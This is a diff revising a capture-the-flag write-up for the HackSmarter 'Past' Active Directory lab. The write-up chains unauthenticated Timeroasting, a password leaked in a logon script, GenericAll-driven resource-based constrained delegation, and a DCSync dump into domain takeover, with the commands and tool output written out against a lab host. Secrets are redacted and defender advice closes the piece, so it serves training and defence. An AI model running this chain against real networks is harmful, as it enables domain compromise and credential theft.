@@ -1,46 +1,39 @@
 ---
-layout: default
-title: "HackSmarter: Past — Timeroasting to Domain Admin"
-description: "Full walkthrough of the HackSmarter 'Past' Active Directory lab (Medium): unauthenticated Timeroasting, a NETLOGON credential leak, a Protected Users account with GenericAll over the Domain Controller, and Resource-Based Constrained Delegation abuse to Domain Admin."
+title: "Past"
+platform: "HackSmarter"
+category: "Active Directory"
+difficulty: "Medium"
 date: 2026-06-12
-author: p3ta00
-tags: ["hacksmarter", "active-directory", "timeroasting", "rbcd", "protected-users", "kerberos", "delegation", "writeup", "medium"]
-image: /assets/images/hacksmarter/past-banner.png
-keywords:
-  - HackSmarter Past
-  - Timeroasting
-  - Resource-Based Constrained Delegation
-  - Protected Users
-  - RBCD S4U2Proxy
-  - Active Directory writeup
+os: "Windows Server 2016"
+tags: ["active-directory", "timeroasting", "rbcd", "s4u2proxy", "protected-users", "server-operators", "genericall", "kerberos", "delegation", "bloodhound", "dcsync", "netexec", "bloodyad"]
 ---
 
-<div class="terminal-output">
-  <p>
-    <span class="prompt-symbol">$</span> <span style="color: var(--cyan);">cat ~/blog/hacksmarter-past.md</span>
-  </p>
-</div>
-
-![Past — HackSmarter](/assets/images/hacksmarter/past-banner.png)
-
-## Overview
-
-**Past** is a **Medium** Active Directory box on HackSmarter. The client — *Past Systems Inc.* — mentioned during the kickoff that they were "currently adding new machines to the network." That throwaway remark is the entire foothold: the freshly **pre-staged computer accounts** were created with weak, human-chosen passwords instead of the random 120-character secrets AD normally assigns.
-
-We start from an **assumed-network** position — VPN access, **no credentials** — and chain:
-
-1. **Timeroasting** (unauthenticated) → crack a weak machine-account password
-2. A **cleartext credential** leaked in a NETLOGON logon script
-3. A **Protected Users** account that nonetheless holds **GenericAll over the Domain Controller** and **Server Operators**
-4. **Resource-Based Constrained Delegation (RBCD)** abuse → impersonate Administrator → **DCSync**
-
-> All hashes, passwords, and flags in this post are **redacted**.
+![Past Banner](/assets/images/ctf/past/banner.png)
 
 ---
 
-## Phase 1 — Enumeration
+## Scenario
 
-### Port Scan
+### Objective and Scope
+
+Past Systems Inc. commissioned the Hack Smarter Red Team for an internal penetration test. During the kickoff, the client mentioned they were **currently adding new machines to the network** — an offhand detail that turns out to be the entire foothold: the freshly pre-staged computer accounts were created with weak, human-chosen passwords instead of the random secrets Active Directory normally assigns.
+
+We start from an **assumed-network** position: VPN access, **no credentials**.
+
+**Difficulty:** Medium
+**OS:** Windows Server 2016
+
+| Host | IP Address | Operating System | Role |
+|------|------------|------------------|------|
+| EC2AMAZ-A5O4OL8 | 10.1.186.193 | Windows Server 2016 | Domain Controller (`past.local`) |
+
+> All hashes, passwords, and flags in this writeup are **redacted**.
+
+---
+
+## Enumeration
+
+### Port Scanning
 
 Kerberos (88), LDAP (389/3268), DNS (53), and `past.local` in the certificate identify a **Domain Controller**.
 
@@ -60,7 +53,11 @@ PORT     STATE SERVICE       VERSION
 3389/tcp open  ms-wbt-server
 ```
 
-> **Tip:** the host drops ICMP, so `ping` fails even though it's up. On Windows targets, confirm reachability with a TCP port (`nc -zv <ip> 445`), never `ping`. And map the FQDN in `/etc/hosts` immediately — Kerberos authenticates against SPNs tied to hostnames, so targeting the bare IP breaks almost every later step.
+The host drops ICMP, so confirm reachability with a TCP port (`nc -zv $TARGET 445`), not `ping`. Map the FQDN in `/etc/hosts` immediately — Kerberos authenticates against SPNs tied to hostnames, so targeting the bare IP breaks nearly every later step.
+
+```
+$ echo '10.1.186.193 EC2AMAZ-A5O4OL8.past.local EC2AMAZ-A5O4OL8 past.local' | sudo tee -a /etc/hosts
+```
 
 ### User Enumeration
 
@@ -76,7 +73,7 @@ $ nxc smb $TARGET -u guest -p '' --rid-brute
 1121: PAST\ryan (SidTypeUser)
 ```
 
-Two human users — **tyler** and **ryan** — and three "DEV" **machine accounts** (the trailing `$`). The DEV accounts line up with the "new machines being added" remark.
+Two human users — **tyler** and **ryan** — and three "DEV" **machine accounts** (trailing `$`), matching the "new machines being added" remark.
 
 ### Guest Share Access
 
@@ -96,11 +93,11 @@ WEBDEV01
 DEV01
 ```
 
-The DEV computer objects have **no DNSHostName** — confirming they're pre-staged accounts with no live host. NetExec's spider also drops a JSON of file metadata whose `*_epoch` timestamps nudge toward a time-based attack.
+The DEV computer objects have **no DNSHostName** — pre-staged accounts with no live host. NetExec's spider also drops a JSON of file metadata whose `*_epoch` timestamps hint at a time-based attack.
 
 ---
 
-## Phase 2 — Unauthenticated Foothold via Timeroasting
+## Initial Access — Timeroasting
 
 **Timeroasting** abuses MS-SNTP (the authenticated NTP variant AD uses). A client can request a time response whose MAC is derived from a **computer account's NT hash**, keyed by **RID** — and crucially, **without authenticating**. The result is an offline-crackable hash of the machine-account password.
 
@@ -122,9 +119,9 @@ Loaded 4 password hashes with 4 different salts (timeroast, SNTP-MS [MD4+MD5 32/
 1115:[REDACTED]
 ```
 
-RID **1115 = APPDEV01$**. Machine passwords are normally random and uncrackable — this one fell instantly because the account was pre-staged with a weak password, exactly the weakness the brief telegraphed.
+RID **1115 = APPDEV01$**. Machine passwords are normally random and uncrackable — this one fell instantly because it was pre-staged with a weak password.
 
-### Validating — and a trap to avoid
+### Validating — and a Trap to Avoid
 
 Spraying the recovered password surfaces one real result and one trap:
 
@@ -135,9 +132,9 @@ $ nxc smb $TARGET -u users -p '[REDACTED]'
 [-] past.local\administrator:... STATUS_LOGON_FAILURE
 ```
 
-> **Do NOT read tyler's `STATUS_ACCOUNT_RESTRICTION` as "correct password, just restricted"** — the most common misread of this box. As we confirm in Phase 4, tyler is in **Protected Users**, which **disables NTLM** for the account, so the DC returns `ACCOUNT_RESTRICTION` to *every* NTLM attempt **regardless of whether the password is right**. The recovered password belongs to APPDEV01$, **not** tyler. NTLM cannot validate tyler; only Kerberos can.
+> **Do not read tyler's `STATUS_ACCOUNT_RESTRICTION` as "correct password, just restricted."** tyler is in **Protected Users**, which **disables NTLM** for the account, so the DC returns `ACCOUNT_RESTRICTION` to *every* NTLM attempt **regardless of whether the password is right**. The recovered password belongs to APPDEV01$, **not** tyler. NTLM cannot validate tyler — only Kerberos can.
 
-Confirm the machine account properly — a genuine success shows `[+]` with **no `(Guest)`** tag:
+A genuine machine-account success shows `[+]` with **no `(Guest)`** tag:
 
 ```
 $ nxc smb $TARGET -u 'APPDEV01$' -p '[REDACTED]' --shares
@@ -148,7 +145,7 @@ SYSVOL          READ
 
 ---
 
-## Phase 3 — Authenticated Enumeration as APPDEV01$
+## Active Directory Enumeration
 
 ### Delegation Review
 
@@ -160,21 +157,20 @@ EC2AMAZ-A5O4OL8$  Computer     Unconstrained               N/A
 tyler             Person       Resource-Based Constrained  DEV01$
 ```
 
-Collecting the graph with BloodHound exposes the edge that actually matters — **tyler → GenericAll → the DC**:
+### BloodHound Analysis — tyler GenericAll on the DC
 
 ```
 $ bloodhound-python -u 'APPDEV01$' -p '[REDACTED]' -d past.local -ns $TARGET -c All --zip
 INFO: Found 4 computers / 7 users / 53 groups
-INFO: Compressing output into 20260612113630_bloodhound.zip
 ```
 
-![BloodHound — tyler GenericAll over the DC](/assets/images/hacksmarter/past-bloodhound.png)
+![tyler GenericAll over the Domain Controller](/assets/images/ctf/past/bloodhound-genericall.png)
 
-> **The key finding:** tyler holds **GenericAll over the Domain Controller computer object**, and is a member of both **Protected Users** and **Server Operators**. The `tyler → RBCD → DEV01$` row is a **red herring** — DEV01 is a pre-staged account with no live host, so a ticket to it is useless. The real lever is GenericAll *on the DC*.
+tyler holds **GenericAll over the Domain Controller computer object** and is a member of both **Protected Users** and **Server Operators**. The `tyler → RBCD → DEV01$` row is a **red herring** — DEV01 is a pre-staged account with no live host. The real lever is GenericAll *on the DC*.
 
 ### NETLOGON Credential Leak
 
-As APPDEV01$ we can now read `NETLOGON`/`SYSVOL`. Logon scripts and GPO files are a classic credential source:
+As APPDEV01$ we can read `NETLOGON`/`SYSVOL`. Logon scripts are a classic credential source:
 
 ```
 $ grep -ri tyler
@@ -183,20 +179,20 @@ NETLOGON/tyler_init.cmd:set TYLER_PASS=[REDACTED]
 SYSVOL/past.local/scripts/tyler_init.cmd:set TYLER_PASS=[REDACTED]
 ```
 
-A logon helper script hard-codes **tyler's password** in cleartext — the modern equivalent of a GPP `cpassword` leak.
+A logon helper hard-codes **tyler's password** in cleartext — the modern equivalent of a GPP `cpassword` leak.
 
 ---
 
-## Phase 4 — Authenticating as tyler (Protected Users)
+## Authenticating as tyler (Protected Users)
 
-Even with the *correct* password, NTLM still refuses tyler:
+Even with the correct password, NTLM still refuses tyler:
 
 ```
 $ nxc smb $TARGET -u 'tyler' -p '[REDACTED]'
 [-] past.local\tyler:... STATUS_ACCOUNT_RESTRICTION
 ```
 
-> **Why:** **Protected Users** disables NTLM (hence `ACCOUNT_RESTRICTION` even with the right password), disables RC4/DES Kerberos etypes (forcing RC4 → `KDC_ERR_ETYPE_NOSUPP`), forces **AES-only Kerberos**, and blocks delegation of the account. Pass-the-hash, over-pass-the-hash, and NTLM relay are all dead — the only way in is **AES Kerberos with the real password**.
+> **Protected Users** disables NTLM (hence `ACCOUNT_RESTRICTION` even with the right password), disables RC4/DES Kerberos etypes (forcing RC4 → `KDC_ERR_ETYPE_NOSUPP`), forces **AES-only Kerberos**, and blocks delegation of the account. Pass-the-hash, over-pass-the-hash, and NTLM relay are all dead — the only way in is **AES Kerberos with the real password**.
 
 Request a TGT over Kerberos and load it:
 
@@ -209,7 +205,7 @@ $ nxc smb $TARGET -k --use-kcache
 [+] PAST.LOCAL\tyler from ccache
 ```
 
-tyler's **Server Operators** membership grants `SeBackupPrivilege`/`SeRestorePrivilege` on the DC, which surfaces as **READ/WRITE on `C$`**:
+tyler's **Server Operators** membership grants `SeBackupPrivilege`/`SeRestorePrivilege` on the DC, surfacing as **READ/WRITE on `C$`**:
 
 ```
 $ nxc smb $TARGET -k --use-kcache --shares
@@ -219,9 +215,7 @@ C$       READ,WRITE
 
 ---
 
-## Phase 5 — Privilege Escalation: GenericAll → RBCD → S4U2Proxy
-
-### The concept
+## Privilege Escalation — GenericAll → RBCD → S4U2Proxy
 
 `GenericAll` over a **computer object** does not let you "log in as" that computer. You exploit it by writing an attribute and having a **separate controlled principal** abuse it:
 
@@ -257,7 +251,7 @@ $ getST.py -spn cifs/EC2AMAZ-A5O4OL8.past.local -impersonate Administrator \
 
 > **The #1 gotcha on this box:** if `KRB5CCNAME` is still exported when you run a **password**-based tool, impacket reuses the *cached* ticket and S4U2Self fails with `KRB_AP_ERR_BADMATCH`. Rule: **password auth → `unset KRB5CCNAME`; ticket auth → `export` it. Never both.**
 
-### Root flag
+### Root Flag
 
 The S4U ticket is for `cifs/` only (no TGT), so use it with an impacket tool — not `nxc --use-kcache`, which wants a TGT and fails silently:
 
@@ -273,7 +267,7 @@ $ nxc smb EC2AMAZ-A5O4OL8.past.local -k --use-kcache --share C$ \
 root.txt: HSM{[REDACTED]}
 ```
 
-### Interactive shell via WinRM
+### Interactive Shell via WinRM
 
 For a shell, request the ticket for the **HTTP** SPN (WinRM's service), not `cifs`:
 
@@ -292,7 +286,7 @@ $ evil-winrm -i EC2AMAZ-A5O4OL8.past.local -r PAST.LOCAL
 
 ---
 
-## Phase 6 — Domain Compromise (DCSync)
+## Domain Compromise — DCSync
 
 ```
 $ secretsdump.py -k -no-pass past.local/administrator@EC2AMAZ-A5O4OL8.past.local
@@ -304,15 +298,15 @@ ryan:1121:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
 [*] Cleaning up...
 ```
 
-Full domain compromise — the `krbtgt` hash enables Golden Tickets for persistence, and the Administrator NT hash gives an interactive SYSTEM shell via pass-the-hash.
+Full domain compromise — the `krbtgt` hash enables Golden Tickets for persistence, and the Administrator NT hash gives a SYSTEM shell via pass-the-hash.
 
-> **On cracking the dump:** only the **human** NT hashes are worth cracking, and as **NTLM (`-m 1000`)** — not `-m 0`. A 32-hex NT hash is byte-identical to an MD5 digest, so auto-detectors guess MD5 and never crack it. Machine accounts and `krbtgt` are random; `31d6cfe0…` is the empty-password hash.
+> Only the **human** NT hashes are worth cracking, and as **NTLM (`-m 1000`)** — not `-m 0`. A 32-hex NT hash is byte-identical to an MD5 digest, so auto-detectors guess MD5 and never crack it. Machine accounts and `krbtgt` are random; `31d6cfe0…` is the empty-password hash.
 
 ---
 
-## Phase 7 — Post-Exploitation: ryan
+## Post-Exploitation — ryan
 
-ryan's NT hash didn't crack against rockyou, so we pivot to the Administrator profile's PowerShell history — operators frequently leave cleartext there:
+ryan's NT hash didn't crack against rockyou, so we pivot to the Administrator profile's PowerShell history:
 
 ```
 *Evil-WinRM* PS ...\PSReadline> type ConsoleHost_history.txt
@@ -339,5 +333,5 @@ $ bloodyAD -k --host EC2AMAZ-A5O4OL8.past.local -d past.local del object 'PWNED1
 - **Timeroasting** is a strong unauthenticated opener against any DC; pre-staged or weak machine accounts fall to `hashcat -m 31300` (or John `--format=timeroast`).
 - **`STATUS_ACCOUNT_RESTRICTION` on a Protected Users account is not a valid-password oracle** — NTLM is refused before the password is judged. Validate with Kerberos.
 - **GenericAll on a computer object ≠ "become that computer"** — pivot through a controlled machine account (RBCD) or the computer's own identity (Shadow Credentials).
-- **Kerberos hygiene:** FQDN everywhere (IP + `-k` → `KDC_ERR_S_PRINCIPAL_UNKNOWN`); `unset KRB5CCNAME` for password auth and `export` it for ticket auth; match the ticket SPN (`cifs` vs `HTTP`) to the tool.
+- **Kerberos hygiene:** FQDN everywhere; `unset KRB5CCNAME` for password auth and `export` it for ticket auth; match the ticket SPN (`cifs` vs `HTTP`) to the tool.
 - **Defenders:** don't pre-stage computer accounts with weak passwords, never store credentials in NETLOGON/SYSVOL logon scripts, and remember that **Server Operators** and **GenericAll on a DC** are effectively Domain Admin.
